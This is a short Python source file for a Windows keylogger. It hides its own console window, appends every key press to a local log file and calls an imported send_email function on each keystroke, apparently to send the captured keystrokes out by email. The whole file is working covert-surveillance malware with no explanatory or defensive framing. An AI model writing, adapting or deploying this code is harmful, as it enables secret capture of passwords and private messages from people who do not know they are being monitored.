import keyboard
import sys
import ctypes

import send_email


# hide console
def hide_console():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.kernel32.SetConsoleTitleW("Hidden")

# keylogger
def on_key_press(event):
    with open('log.txt', 'a') as f:
        f.write(event.name)

    send_email.send()

keyboard.on_press(on_key_press)

hide_console()



keyboard.wait()